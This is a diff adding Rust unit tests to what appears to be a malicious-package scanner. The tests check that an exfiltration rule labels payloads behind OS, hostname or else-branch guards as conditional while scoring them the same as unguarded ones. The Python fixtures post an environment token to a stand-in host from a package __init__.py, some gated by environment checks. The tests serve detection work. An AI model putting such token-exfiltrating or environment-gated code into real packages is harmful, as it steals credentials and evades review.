@@ -762,4 +762,79 @@ subprocess.run([p])
             drp2.evidence.path.steps
         );
     }
+
+    // ── ADR-030: conditional execution is labelled, never weighed ──────────────────────
+
+    fn exfil_paths(src: &str) -> Vec<(bool, f64)> {
+        let g = graph(&[("pkg/__init__.py", src)]);
+        evaluate(&g, &ScanOptions::default())
+            .unwrap()
+            .iter()
+            .filter(|f| f.rule.as_str() == "PHX-EXF-001")
+            .map(|f| (f.evidence.path.conditional, f.score.value()))
+            .collect()
+    }
+
+    const SEND: &str = "requests.post('https://c.example.invalid/', data=os.environ['TOKEN'])";
+
+    #[test]
+    fn a_payload_under_an_os_check_is_conditional_and_scores_the_same() {
+        let guarded = format!(
+            "import os, platform, requests
+if platform.system() == 'Windows':
+    {SEND}
+"
+        );
+        let plain = format!(
+            "import os, requests
+{SEND}
+"
+        );
+        let debug = format!(
+            "import os, requests
+DEBUG = True
+if DEBUG:
+    {SEND}
+"
+        );
+        let g = exfil_paths(&guarded);
+        let p = exfil_paths(&plain);
+        let d = exfil_paths(&debug);
+        assert_eq!(g.len(), 1, "{g:?}");
+        assert!(g[0].0, "guarded by an OS check");
+        assert!(
+            !p[0].0 && !d[0].0,
+            "plain and DEBUG-guarded are not conditional"
+        );
+        assert_eq!(g[0].1, p[0].1, "a label, not a weight");
+    }
+
+    #[test]
+    fn aliased_guards_and_else_branches_are_conditional() {
+        let aliased = format!(
+            "import os, requests
+import platform as p
+if p.system() == 'Linux':
+    {SEND}
+"
+        );
+        let otherwise = format!(
+            "import os, sys, requests
+if sys.platform == 'darwin':
+    pass
+else:
+    {SEND}
+"
+        );
+        let host = format!(
+            "import os, socket, requests
+if socket.gethostname().startswith('build'):
+    {SEND}
+"
+        );
+        for src in [aliased, otherwise, host] {
+            let paths = exfil_paths(&src);
+            assert!(!paths.is_empty() && paths.iter().all(|(c, _)| *c), "{src}");
+        }
+    }
 }
